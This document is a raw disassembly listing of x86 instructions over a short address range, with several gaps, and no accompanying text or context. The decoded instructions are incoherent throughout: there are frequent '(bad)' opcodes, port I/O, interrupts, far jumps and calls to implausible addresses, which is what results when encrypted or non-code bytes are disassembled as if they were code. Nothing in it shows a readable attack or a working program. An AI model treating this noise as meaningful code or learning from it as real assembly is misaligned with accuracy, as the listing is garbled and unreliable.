  41b220:	gs dec esp
  41b222:	and    dh,dl
  41b224:	outs   dx,DWORD PTR ds:[esi]
  41b225:	cdq    
  41b226:	shl    BYTE PTR [ebx+0x16],0xa5
  41b22a:	xor    eax,0xd655276e
  41b22f:	adc    DWORD PTR [esi+ecx*4+0x79],0xffffffee
  41b234:	mov    bh,0x6d
  41b236:	(bad)  
  41b238:	je     0x41b1f2
  41b23a:	mov    edx,0x68ff0468
  41b23f:	jp     0x41b27c
  41b241:	shl    DWORD PTR [ebx+edx*4],0x1
  41b245:	cwde   
  41b246:	lods   al,BYTE PTR ds:[esi]
  41b247:	lods   al,BYTE PTR ds:[esi]
  41b248:	mov    cl,0x72
  41b24a:	inc    edx
  41b24b:	mov    ch,0x73
  41b24d:	add    DWORD PTR [edi-0x5b],0xa00ae71b
  41b254:	test   eax,0xc0273d2d
  41b259:	pop    edi
  41b25a:	imul   WORD PTR [edx]
  41b25d:	jns    0x41b2c9
  41b25f:	int3   
  41b260:	sbb    al,0xca
  41b262:	lahf   
  41b263:	push   ecx
  41b264:	ins    DWORD PTR es:[edi],dx
  41b265:	jb     0x41b1fc
  41b267:	or     eax,0xdcc37bd2
  41b26c:	repz pop esi
	...
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [edx],cl
  41b2e3:	sub    al,0xdb
  41b2e5:	xor    eax,0x12467
  41b2ea:	add    BYTE PTR [ecx],al
  41b2ec:	add    BYTE PTR [eax],al
  41b2ee:	push   0xffffffd3
  41b2f0:	adc    eax,0x3ace355d
  41b2f5:	test   eax,0xefa01845
  41b2fa:	mov    esi,0x254e55ee
  41b2ff:	in     al,0xe0
  41b301:	jle    0x41b291
  41b303:	pusha  
  41b304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b305:	rcl    BYTE PTR [edi],cl
  41b307:	sub    eax,0xa52bc4ef
  41b30c:	mov    edi,0xfdb9ec28
  41b311:	sub    DWORD PTR [ebp-0x13],esp
  41b314:	fninit 
  41b316:	loope  0x41b34b
  41b318:	push   ebx
  41b319:	int    0xd7
  41b31b:	mov    edi,0x91b261cc
  41b320:	mov    esi,cs
  41b322:	mov    ds:0x89c06193,al
  41b327:	mov    ch,0xe5
  41b329:	mov    ds:0xb177f606,al
  41b32e:	or     BYTE PTR [edx-0x53],ah
  41b331:	push   ebx
  41b332:	dec    esp
  41b333:	jg     0x41b320
  41b335:	jp     0x41b3a4
  41b337:	mov    bl,0x27
  41b339:	inc    esi
  41b33a:	scas   al,BYTE PTR es:[edi]
  41b33b:	sub    eax,0x8506f489
  41b340:	int    0x91
  41b342:	ror    DWORD PTR [ecx-0x80],0x4a
  41b346:	dec    edx
  41b347:	jb     0x41b3b1
  41b349:	(bad)  
  41b34a:	ja     0x41b2e8
  41b34c:	cld    
  41b34d:	or     DWORD PTR [esi],ebp
  41b34f:	std    
  41b350:	sub    esi,DWORD PTR [ebp+0xd]
  41b353:	shr    bl,0xc7
  41b356:	ret    0x3b6b
  41b359:	or     bl,BYTE PTR [ebx+0x6e]
  41b35c:	or     BYTE PTR [esi],dh
  41b35e:	in     al,dx
  41b35f:	test   DWORD PTR [edi+0x4e],ebx
  41b362:	xlat   BYTE PTR ds:[ebx]
  41b363:	mov    ds:0x2d7d9c40,eax
  41b368:	call   0x7bf733f
  41b36d:	rcl    edx,1
  41b36f:	fdivr  st,st(1)
  41b371:	into   
  41b372:	test   al,0xde
  41b374:	and    al,0xe0
  41b376:	rol    BYTE PTR [ebp-0x134e114c],0xb4
  41b37d:	mov    ch,0x4a
  41b37f:	jg     0x41b36f
  41b381:	pop    es
  41b382:	ds stc 
  41b384:	mov    al,ds:0x1a1f9e40
  41b389:	inc    edi
  41b38a:	retf   
  41b38b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b38c:	lock out 0x75,eax
  41b38f:	imul   edx,eax,0x23
  41b392:	jae    0x41b363
  41b394:	gs dec esp
  41b396:	lea    ecx,[ebp-0x45285500]
  41b39c:	mov    eax,DWORD PTR [esp+edx*8+0x78]
  41b3a0:	dec    edx
  41b3a1:	stos   DWORD PTR es:[edi],eax
  41b3a2:	js     0x41b3cd
  41b3a4:	call   0xb3b3f96c
  41b3a9:	scas   eax,DWORD PTR es:[edi]
  41b3aa:	pop    ecx
  41b3ab:	or     al,0x90
  41b3ad:	cmp    DWORD PTR [eax+0x62],ebx
  41b3b0:	cs cdq 
  41b3b2:	cmp    eax,0x8f91538f
  41b3b7:	sbb    ah,BYTE PTR [edx]
  41b3b9:	out    0x93,eax
  41b3bb:	ja     0x41b3c2
  41b3bd:	mov    ch,0x7b
  41b3bf:	push   ecx
  41b3c0:	cdq    
  41b3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3c2:	ds aad 0x42
  41b3c5:	cmp    DWORD PTR [esi+0x104d9f56],edx
  41b3cb:	popa   
  41b3cc:	sar    al,cl
  41b3ce:	xchg   edi,eax
  41b3cf:	inc    edi
  41b3d0:	dec    edi
  41b3d1:	iret   
  41b3d2:	mov    eax,edi
  41b3d4:	and    BYTE PTR [edx+0x1db4db88],0x29
  41b3db:	in     al,dx
  41b3dc:	jmp    0x41b3c0
  41b3de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3df:	jl     0x41b406
  41b3e1:	leave  
  41b3e2:	mov    dl,BYTE PTR [ecx+0x3bd7d84a]
  41b3e8:	jnp    0x41b38b
  41b3ea:	push   0x4f7c5d
	...
  41b453:	add    BYTE PTR [eax],al
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	inc    ebx
  41b463:	xchg   esi,eax
  41b464:	data16 ins BYTE PTR es:[edi],dx
  41b466:	addr16 and eax,0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	xchg   edi,eax
  41b46f:	in     eax,dx
  41b470:	cmp    BYTE PTR [ebp+0x5182f618],0x5f
  41b477:	pop    esp
  41b478:	mov    ch,0x22
  41b47a:	retf   
  41b47b:	dec    edi
  41b47c:	xchg   esp,eax
  41b47d:	mov    ebp,0x2252d939
  41b482:	mov    al,ds:0xdfaa58ef
  41b487:	(bad)  
  41b488:	shl    BYTE PTR [ebp+0x6831d61e],1
  41b48e:	shl    DWORD PTR [eax-0x29],cl
  41b491:	cdq    
  41b492:	dec    esp
  41b493:	or     al,0x65
  41b495:	mov    eax,0x1f3cdb00
  41b49a:	dec    edx
  41b49b:	sar    dh,1
  41b49d:	add    al,0x1c
  41b49f:	xchg   esi,eax
  41b4a0:	inc    ebx
  41b4a1:	add    eax,0xc71fad49
  41b4a6:	sbb    esi,edi
  41b4a8:	inc    esi
  41b4a9:	sbb    bl,BYTE PTR [edx+0x2d113f09]
  41b4af:	in     eax,0x17
  41b4b1:	data16 aas 
  41b4b3:	es xor al,0x56
  41b4b6:	lods   al,BYTE PTR ds:[esi]
  41b4b7:	xchg   edx,edi
  41b4b9:	inc    ebx
  41b4ba:	aaa    
  41b4bb:	mov    al,0x69
  41b4bd:	fst    DWORD PTR [ebp+0x5a]
  41b4c0:	stc    
  41b4c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4c2:	mov    ebp,0x30e1c199
  41b4c7:	test   BYTE PTR [eax+0x30d41894],dl
  41b4cd:	dec    edi
  41b4ce:	lahf   
  41b4cf:	fcomp  QWORD PTR [ebx+0x17c3a266]
  41b4d5:	ins    DWORD PTR es:[edi],dx
  41b4d6:	push   ebx
  41b4d7:	rol    DWORD PTR ds:0x2d1bd718,cl
  41b4dd:	pop    ebp
  41b4de:	sub    eax,DWORD PTR [edi-0x13c8bfb]
  41b4e4:	and    ah,al
  41b4e6:	call   0x4f17faae
  41b4eb:	xchg   esp,eax
  41b4ec:	cmp    bh,bh
  41b4ee:	jge    0x41b511
  41b4f0:	js     0x41b4e3
  41b4f2:	dec    edi
  41b4f3:	pop    esi
  41b4f4:	aaa    
  41b4f5:	sbb    DWORD PTR [ebp+0x2966fd9c],ecx
  41b4fb:	mov    ebx,0x6109ec1d
  41b500:	mov    eax,ds:0xfa35a3ef
  41b505:	aam    0xd4
  41b507:	mov    bl,0xbb
  41b509:	pop    edi
  41b50a:	fs hlt 
  41b50c:	inc    esi
  41b50d:	sti    
  41b50e:	fdiv   st(6),st
  41b510:	je     0x41b51c
  41b512:	pop    ds
  41b513:	inc    edx
  41b514:	hlt    
  41b515:	jl     0x41b57c
  41b517:	sub    cl,cl
  41b519:	cmp    eax,0xeb35dcfd
  41b51e:	xchg   edx,eax
  41b51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b520:	xchg   esp,eax
  41b521:	std    
  41b522:	and    ecx,DWORD PTR [esi+0x36ecc19a]
  41b528:	aam    0x79
  41b52a:	scas   al,BYTE PTR es:[edi]
  41b52b:	test   al,0x70
  41b52d:	add    DWORD PTR [esi-0x35cab4d4],ecx
  41b533:	push   es
  41b534:	sbb    BYTE PTR [edi-0x3],bl
  41b537:	xchg   BYTE PTR [esi+ecx*4-0x99a9f11],al
  41b53e:	xchg   edi,eax
  41b53f:	xchg   ebp,eax
  41b540:	mov    ecx,0x5cbe1547
  41b545:	xchg   edx,eax
  41b546:	or     dl,BYTE PTR [edi+0x5babb8dc]
  41b54c:	mov    esi,0xc1c15478
  41b551:	pop    edx
  41b552:	sub    eax,0xaa42db88
  41b557:	xor    eax,0xb725feff
  41b55c:	imul   BYTE PTR [edx+0x44]
  41b55f:	mov    bh,0x68
  41b561:	test   BYTE PTR [esi],cl
  41b563:	sub    eax,0xcd61c2d9
  41b568:	cwde   
  41b569:	lods   al,BYTE PTR ds:[esi]
  41b56a:	leave  
  41b56b:	loopne 0x41b54d
  41b56d:	pop    ds
	...
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	sub    eax,0x67d6a28e
  41b5e7:	add    DWORD PTR es:[eax],eax
  41b5ea:	add    BYTE PTR [ecx],al
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	js     0x41b64b
  41b5f0:	push   cs
  41b5f1:	dec    ebp
  41b5f2:	cmp    DWORD PTR [edi-0x4332ddfc],esi
  41b5f8:	mov    cl,0xc7
  41b5fa:	adc    BYTE PTR [esi],ah
  41b5fc:	and    esi,DWORD PTR [edi+0x16a800c1]
  41b602:	(bad)  
  41b603:	adc    eax,0xae4d71ae
  41b608:	retf   
  41b609:	repnz fsub QWORD PTR [esp+ebp*4+0xaf69eae]
  41b611:	push   ecx
  41b612:	fadd   DWORD PTR [eax+ebx*1+0x1b]
  41b616:	push   edx
  41b617:	jmp    0x41b68f
  41b619:	and    edi,DWORD PTR [esp+ebx*1+0x26aab21f]
  41b620:	cld    
  41b621:	jg     0x41b65c
  41b623:	iret   
  41b624:	jecxz  0x41b671
  41b626:	push   es
  41b627:	mov    dl,0xbf
  41b629:	mov    eax,0x93f92a0e
  41b62e:	in     eax,dx
  41b62f:	mov    edx,0x4dd1d17a
  41b634:	cmc    
  41b635:	sub    ah,BYTE PTR [edx+eax*2-0xd]
  41b639:	shr    ecx,cl
  41b63b:	and    BYTE PTR [esi],bh
  41b63d:	mov    ecx,0xe768e159
  41b642:	push   ebx
  41b643:	cmp    esi,DWORD PTR [edx+0x5f0b5642]
  41b649:	fscale 
  41b64b:	mov    cl,0x39
  41b64d:	jmp    0x41b637
  41b64f:	cmp    al,0x57
  41b651:	pop    ebp
  41b652:	pop    esp
  41b653:	daa    
  41b654:	push   es
  41b655:	icebp  
  41b656:	jbe    0x41b6d4
  41b658:	popa   
  41b659:	inc    ecx
  41b65a:	xchg   ecx,eax
  41b65b:	lea    ebp,[edx+0x513aaedf]
  41b661:	stos   BYTE PTR es:[edi],al
  41b662:	sub    al,0x8a
  41b664:	sahf   
  41b665:	int    0x77
  41b667:	push   es
  41b668:	cmp    esi,DWORD PTR [edx+0x23]
  41b66b:	xlat   BYTE PTR ds:[ebx]
  41b66c:	jge    0x41b688
  41b66e:	xor    DWORD PTR [edi-0x552f8e20],ebp
  41b674:	aaa    
  41b675:	inc    edi
  41b676:	push   edx
  41b677:	adc    BYTE PTR [ebp+0x4fa7e208],dh
  41b67d:	je     0x41b665
  41b67f:	pxor   mm5,QWORD PTR [edi+0x1e]
  41b683:	push   0xffffffda
  41b685:	stos   DWORD PTR es:[edi],eax
  41b686:	jmp    0x41b60e
  41b688:	add    dl,dh
  41b68a:	adc    al,0x75
  41b68c:	arpl   WORD PTR [edi],ax
  41b68e:	mov    ch,0x9f
  41b690:	dec    ebp
  41b691:	jno    0x41b6cb
  41b693:	popa   
  41b694:	out    dx,al
  41b695:	int    0xa3
  41b697:	ja     0x41b6e9
  41b699:	mov    al,0xe5
  41b69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b69c:	pop    edx
  41b69d:	dec    ecx
  41b69e:	mov    ch,0x49
  41b6a0:	or     al,0x70
  41b6a2:	out    0x18,eax
  41b6a4:	sbb    bl,BYTE PTR [eax-0x18]
  41b6a7:	adc    BYTE PTR [ecx-0x34],al
  41b6aa:	cmc    
  41b6ab:	aam    0xe5
  41b6ad:	cmp    eax,DWORD PTR [ecx-0x7d8dd6b0]
  41b6b3:	mov    ah,0x5
  41b6b5:	ret    
  41b6b6:	sbb    eax,0x3917d1a3
  41b6bb:	or     DWORD PTR [edi-0x76],edx
  41b6be:	or     al,0x19
  41b6c0:	retf   0xbf10
  41b6c3:	lods   al,BYTE PTR ds:[esi]
  41b6c4:	adc    dl,dl
  41b6c6:	or     dh,BYTE PTR [eax]
  41b6c8:	adc    DWORD PTR [esi+0x74],0xf46887e0
  41b6cf:	push   ss
  41b6d0:	mov    cl,0x61
  41b6d2:	in     al,dx
  41b6d3:	out    0x72,eax
  41b6d5:	xchg   edx,eax
  41b6d6:	mul    DWORD PTR [ebp-0x36a7b300]
  41b6dc:	fwait
  41b6dd:	xor    DWORD PTR [edx+eiz*4+0x7a],esp
  41b6e1:	mov    bh,bl
  41b6e3:	or     DWORD PTR [esi+0x70],0xcdfe0f28
  41b6ea:	lahf   
  41b6eb:	push   edi
  41b6ec:	ret    0xf8
	...
  41b753:	add    BYTE PTR [eax],al
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	out    0x32,al
  41b764:	dec    edi
  41b765:	mov    esi,0x12767
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	into   
  41b76f:	out    dx,eax
  41b770:	xor    DWORD PTR [esi],ebx
  41b772:	cmp    BYTE PTR [edx-0x6de31332],0x5f
  41b779:	retf   0xdf02
  41b77c:	inc    eax
  41b77d:	and    al,0xe6
  41b77f:	ret    0xd60b
  41b782:	mov    ds:0x53872b2,eax
  41b787:	dec    DWORD PTR ds:0xc5571e5b
  41b78d:	imul   BYTE PTR [ebx-0xde39d52]
  41b793:	in     al,dx
  41b794:	sbb    BYTE PTR [eax-0x47],0x91
  41b798:	adc    dl,BYTE PTR [ecx]
  41b79a:	jne    0x41b7ca
  41b79c:	scas   eax,DWORD PTR es:[edi]
  41b79d:	sahf   
  41b79e:	inc    DWORD PTR [ebx+0x101e55a9]
  41b7a4:	aaa    
  41b7a5:	out    0xcd,al
  41b7a7:	hlt    
  41b7a8:	pop    edx
  41b7a9:	daa    
  41b7aa:	push   ss
  41b7ab:	(bad)  
  41b7ac:	jmp    0x157d:0xa4f17c3b
  41b7b3:	push   esi
  41b7b4:	mov    eax,ds:0x4ca1c9c
  41b7b9:	dec    ebx
  41b7ba:	test   al,0xc8
  41b7bc:	push   eax
  41b7bd:	mov    edi,0x1283ac07
  41b7c2:	xchg   esi,eax
  41b7c3:	push   0xffffffe3
  41b7c5:	xor    BYTE PTR [ebx],dl
  41b7c7:	pusha  
  41b7c8:	dec    ebp
  41b7c9:	sbb    BYTE PTR [ecx+0xb123741],dh
  41b7cf:	mov    edi,DWORD PTR [eax]
  41b7d1:	imul   ecx,DWORD PTR [edx+0x64],0xd
  41b7d5:	bnd ja 0x41b7d1
  41b7d8:	sbb    al,0x5e
  41b7da:	adc    ch,BYTE PTR [esi]
  41b7dc:	jge    0x41b7c5
  41b7de:	js     0x41b843
  41b7e0:	pushf  
  41b7e1:	ds xor esp,ebx
  41b7e4:	inc    esi
  41b7e5:	ret    0xec05
  41b7e8:	pop    ecx
  41b7e9:	lea    eax,[ebp+ebp*1+0x37b6cd15]
  41b7f0:	dec    eax
  41b7f1:	push   esi
  41b7f2:	sbb    eax,0xc9f5b487
  41b7f7:	int    0x20
  41b7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7fa:	add    esi,edx
  41b7fc:	arpl   WORD PTR [ecx+0x2db73eae],di
  41b802:	fild   QWORD PTR [edi+0xa89f8d5]
  41b808:	pop    ecx
  41b809:	or     DWORD PTR [ebx-0x12b13831],edi
  41b80f:	jle    0x41b804
  41b811:	cmp    DWORD PTR [ecx+ecx*4-0x7279bc08],ebx
  41b818:	out    dx,al
  41b819:	retf   0x20e1
  41b81c:	mov    WORD PTR [edi],?
  41b81e:	add    al,0x4a
  41b820:	inc    ebx
  41b821:	ret    0x592e
  41b824:	and    eax,0x4d8e0dac
  41b829:	dec    edi
  41b82a:	sbb    al,0xed
  41b82c:	or     al,BYTE PTR [edi+ecx*2+0x7c]
  41b830:	test   al,0x7f
  41b832:	pop    edx
  41b833:	aas    
  41b834:	push   0x4e
  41b836:	ret    
  41b837:	xor    al,0x13
  41b839:	push   ebp
  41b83a:	push   es
  41b83b:	xchg   ebx,eax
  41b83c:	rol    BYTE PTR [eax+0x70bab35b],1
  41b842:	sub    eax,0x8ebfb821
  41b847:	mov    bl,0x53
  41b849:	ret    0xec4e
  41b84c:	xchg   esi,eax
  41b84d:	inc    eax
  41b84e:	mov    edi,0x6f04f24c
  41b853:	xchg   DWORD PTR [ebp+0x4830c802],edi
  41b859:	mov    ch,BYTE PTR [ecx]
  41b85b:	mov    al,ds:0x439b5ed0
  41b860:	and    eax,0xb014ce8d
  41b865:	retf   
  41b866:	lds    esp,FWORD PTR [edi-0x7c0aa8a2]
  41b86c:	aas    
  41b86d:	stos   BYTE PTR es:[edi],al
	...
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x9e
  41b8e3:	xchg   esp,eax
  41b8e4:	cmp    ecx,ebp
  41b8e6:	sub    BYTE PTR [bx+di],al
  41b8e9:	add    BYTE PTR [eax],al
  41b8eb:	add    DWORD PTR [eax],eax
  41b8ed:	add    BYTE PTR [esi+0x39],ch
  41b8f0:	jecxz  0x41b87e
  41b8f2:	or     esp,ebp
  41b8f4:	and    DWORD PTR ds:0xce8b68b1,eax
  41b8fa:	push   cs
  41b8fb:	les    eax,FWORD PTR [edi-0xcfdbd0f]
  41b901:	sub    BYTE PTR [ebx-0x5d5dcc57],ch
  41b907:	jae    0x41b94d
  41b909:	inc    esp
  41b90a:	pop    es
  41b90b:	sub    eax,DWORD PTR [ecx]
  41b90d:	cmp    edi,DWORD PTR [ebx]
  41b90f:	cld    
  41b910:	loop   0x41b8c1
  41b912:	mov    al,ds:0xfec6c974
  41b917:	sbb    al,0x2f
  41b919:	loope  0x41b94e
  41b91b:	aaa    
  41b91c:	shr    DWORD PTR [eax],0x2c
  41b91f:	ds push 0x84bedcf3
  41b925:	icebp  
  41b926:	dec    edx
  41b927:	sbb    al,dh
  41b929:	adc    eax,0xde0b79c0
  41b92e:	loop   0x41b97e
  41b930:	iret   
  41b931:	mov    ch,0x99
  41b933:	les    ebp,FWORD PTR [ebp+0x5b]
  41b936:	mov    al,ds:0xa099b722
  41b93b:	adc    ecx,esp
  41b93d:	sbb    BYTE PTR [edi-0x35],0x39
  41b941:	repz mov bh,0x5b
  41b944:	fs and eax,0xf9beb769
  41b94a:	jge    0x41b931
  41b94c:	xor    bl,BYTE PTR [ebp+0x73]
  41b94f:	imul   esi,DWORD PTR [ebp-0x19f8a4fe],0x1e
  41b956:	(bad)  
  41b957:	push   ebp
  41b958:	das    
  41b959:	in     eax,dx
  41b95a:	jo     0x41b929
  41b95c:	sbb    ebx,ebp
  41b95e:	data16 and dl,dl
  41b961:	ds xchg edi,eax
  41b963:	cmp    al,0x99
  41b965:	sbb    BYTE PTR [ebx],bl
  41b967:	add    eax,0x7e2c101f
  41b96c:	add    eax,0x3208c053
  41b971:	mov    bl,0x81
  41b973:	inc    ecx
  41b974:	and    eax,DWORD PTR [edx]
  41b976:	add    ebx,DWORD PTR [ecx+esi*8]
  41b979:	lock xor bl,bl
  41b97c:	jno    0x41b908
  41b97e:	icebp  
  41b97f:	mov    eax,ds:0x73ddee49
  41b984:	cwde   
  41b985:	cli    
  41b986:	loopne 0x41b9fe
  41b988:	xor    al,0xe4
  41b98a:	mov    ch,0xf
  41b98c:	add    eax,0x4433fb5f
  41b991:	mov    edx,0x97cacd4c
  41b996:	fs std 
  41b998:	repnz out dx,eax
  41b99a:	(bad)  
  41b99b:	or     al,BYTE PTR [edi+0xc]
  41b99e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b99f:	aaa    
  41b9a0:	sahf   
  41b9a1:	add    DWORD PTR [ecx],eax
  41b9a3:	aaa    
  41b9a4:	fnstenv [edi-0x7c51802b]
  41b9aa:	xor    al,ch
  41b9ac:	leave  
  41b9ad:	and    al,0x18
  41b9af:	scas   al,BYTE PTR es:[edi]
  41b9b0:	bound  edi,QWORD PTR [esi+0x7d]
  41b9b3:	mov    al,ds:0x7035395b
  41b9b8:	mov    eax,ds:0x4c2008d1
  41b9bd:	dec    edx
  41b9be:	and    BYTE PTR [ebp+0x45],dl
  41b9c1:	pusha  
  41b9c2:	ins    BYTE PTR es:[edi],dx
  41b9c3:	in     eax,0x1e
  41b9c5:	mov    ebx,0x2e2a8405
  41b9ca:	fwait
  41b9cb:	(bad)  
  41b9cc:	out    0x91,al
  41b9ce:	aad    0x5d
  41b9d0:	cld    
  41b9d1:	sti    
  41b9d2:	and    al,0x63
  41b9d4:	test   al,0xf1
  41b9d6:	outs   dx,DWORD PTR ds:[esi]
  41b9d7:	sbb    esi,ebp
  41b9d9:	stos   DWORD PTR es:[edi],eax
  41b9da:	push   es
  41b9db:	lods   eax,DWORD PTR ds:[esi]
  41b9dc:	repnz outs dx,BYTE PTR ds:[esi]
  41b9de:	sub    al,0xeb
  41b9e0:	sbb    eax,0xa3d0c8e3
  41b9e5:	sar    DWORD PTR [ecx],0xc8
  41b9e8:	add    edx,esp
  41b9ea:	dec    ebx
  41b9eb:	scas   eax,DWORD PTR es:[edi]
  41b9ec:	jae    0x41ba4c
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	jnp    0x41baa2
  41ba64:	mov    dl,0x8f
  41ba66:	sub    DWORD PTR [bx+di],eax
  41ba69:	add    BYTE PTR [eax],al
  41ba6b:	add    DWORD PTR [eax],eax
  41ba6d:	add    bh,bl
  41ba6f:	frstor [edx-0x2b6eb0a6]
  41ba75:	xlat   BYTE PTR ds:[ebx]
  41ba76:	fwait
  41ba77:	pop    eax
  41ba78:	rcr    ebp,cl
  41ba7a:	addr16 add al,0x60
  41ba7d:	jmp    0xcf17d0f2
  41ba82:	jns    0x41ba94
  41ba84:	jmp    0xe9f56966
  41ba89:	cwde   
  41ba8a:	jnp    0x41ba58
  41ba8c:	inc    eax
  41ba8d:	push   edi
  41ba8e:	and    esi,ebx
  41ba90:	aaa    
  41ba91:	xchg   ecx,eax
  41ba92:	inc    edx
  41ba93:	sti    
  41ba94:	mov    ebx,DWORD PTR [ecx]
  41ba96:	cmp    bl,cl
  41ba98:	xor    BYTE PTR ds:0x42d7b454,ah
  41ba9e:	rol    BYTE PTR [edx],0x7b
  41baa1:	pop    ebx
  41baa2:	inc    eax
  41baa3:	int3   
  41baa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baa5:	(bad)  
  41baa6:	lea    ebx,ds:0xffbe43a3
  41baac:	into   
  41baad:	shr    ecx,0x9c
  41bab0:	rol    BYTE PTR [ecx-0x25],0x7d
  41bab4:	cwde   
  41bab5:	jmp    0x41ba9d
  41bab7:	lods   al,BYTE PTR ds:[esi]
  41bab8:	gs mov ebx,0xcc90c6ac
  41babe:	repnz pop esi
  41bac0:	ret    
  41bac1:	or     BYTE PTR [edi],dh
  41bac3:	loopne 0x41bab9
  41bac5:	(bad)  
  41bac6:	mov    bl,0x86
  41bac8:	jns    0x41ba6e
  41baca:	push   ds
  41bacb:	in     eax,0x44
  41bacd:	push   esi
  41bace:	jne    0x41ba69
  41bad0:	(bad)  
  41bad2:	xchg   edi,eax
  41bad3:	mov    edx,0xebeab621
  41bad8:	cmc    
  41bad9:	dec    esp
  41bada:	jbe    0x41baa4
  41badc:	popa   
  41badd:	(bad)  
  41bade:	pusha  
  41badf:	aam    0x80
  41bae1:	das    
  41bae2:	xchg   esi,eax
  41bae3:	fisubr WORD PTR [ebp-0x2866cb1b]
  41bae9:	loop   0x41ba81
  41baeb:	push   0x83552f59
  41baf0:	xor    al,0x3c
  41baf2:	sub    dl,bl
  41baf4:	sbb    al,0xe
  41baf6:	xchg   esi,eax
  41baf7:	inc    esp
  41baf8:	fsubr  DWORD PTR [esi+0x72aed810]
  41bafe:	or     al,0x84
  41bb00:	inc    esi
  41bb01:	xor    ebp,edx
  41bb03:	hlt    
  41bb04:	push   ecx
  41bb05:	sbb    BYTE PTR [ebp-0x795f0dcb],cl
  41bb0b:	ds pop esi
  41bb0d:	xchg   edi,eax
  41bb0e:	push   ss
  41bb0f:	mov    ecx,0x1bba8bbf
  41bb14:	jecxz  0x41bada
  41bb16:	add    BYTE PTR [ebx-0x12],dl
  41bb19:	inc    ebp
  41bb1a:	test   al,0x6f
  41bb1c:	stos   BYTE PTR es:[edi],al
  41bb1d:	out    dx,al
  41bb1e:	ret    
  41bb1f:	jnp    0x41baeb
  41bb21:	jmp    0x8260:0x36b48f6d
  41bb28:	push   edi
  41bb29:	add    ch,dl
  41bb2b:	retf   0x76be
  41bb2e:	jo     0x41bb43
  41bb30:	pop    edx
  41bb31:	mov    ah,0x25
  41bb33:	push   0x10dcba59
  41bb38:	pop    esp
  41bb39:	jmp    0x9dd2780e
  41bb3e:	mov    ecx,0xe7b4f14f
  41bb43:	sbb    al,al
  41bb45:	sub    eax,0x9c1174eb
  41bb4a:	jno    0x41bb78
  41bb4c:	mov    ebx,0xd0bb79a5
  41bb51:	fadd   st,st(7)
  41bb53:	inc    BYTE PTR [eax+0x21]
  41bb56:	les    ecx,FWORD PTR [esi-0x10cd64fb]
  41bb5c:	sub    BYTE PTR [ecx+0x79],0xb7
  41bb60:	push   ds
  41bb61:	js     0x41bb4a
  41bb63:	xchg   esp,edi
  41bb65:	push   0xae0ae7cd
  41bb6a:	js     0x41bb2b
  41bb6c:	cdq    
  41bb6d:	hlt    
	...
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi-0x2a],cx
  41bbe3:	cmp    eax,0x2a67a281
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	add    BYTE PTR [ecx],al
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	dec    ebx
  41bbef:	ins    BYTE PTR es:[edi],dx
  41bbf0:	xchg   ebx,eax
  41bbf1:	push   es
  41bbf2:	inc    esi
  41bbf3:	loope  0x41bb95
  41bbf5:	lea    ebx,ds:0x7a090b88
  41bbfb:	in     eax,0xf9
  41bbfd:	mov    ah,0x6e
  41bbff:	jge    0x41bc76
  41bc01:	rcl    DWORD PTR ds:0x551b9dc3,0xa0
  41bc08:	std    
  41bc09:	int3   
  41bc0a:	test   eax,0x8501c844
  41bc0f:	xchg   edx,eax
  41bc10:	das    
  41bc11:	adc    eax,0x75ee0ee
  41bc16:	repz ret 
  41bc18:	mov    edx,0x3193a90d
  41bc1d:	retf   
  41bc1e:	(bad)  [esi]
  41bc20:	imul   esi,ebx,0xffffff80
  41bc23:	mov    ds:0x99cf47c,al
  41bc28:	enter  0xce0e,0x38
  41bc2c:	mov    cl,0x31
  41bc2e:	mov    esi,0x6a841112
  41bc33:	leave  
  41bc34:	dec    edx
  41bc35:	in     eax,0xf0
  41bc37:	in     eax,0xd6
  41bc39:	mov    ecx,0x469d6cf2
  41bc3e:	nop
  41bc3f:	and    al,0x1b
  41bc41:	fbld   TBYTE PTR [esi+ebp*8]
  41bc44:	(bad)  
  41bc45:	jo     0x41bbf0
  41bc47:	pop    ss
  41bc48:	in     eax,0x28
  41bc4a:	fsub   DWORD PTR [eax]
  41bc4d:	std    
  41bc4e:	test   al,0x7e
  41bc50:	jmp    0x41bc6d
  41bc52:	xchg   esp,eax
  41bc53:	sub    al,0x9
  41bc55:	gs sahf 
  41bc57:	cs out dx,al
  41bc59:	xchg   edx,eax
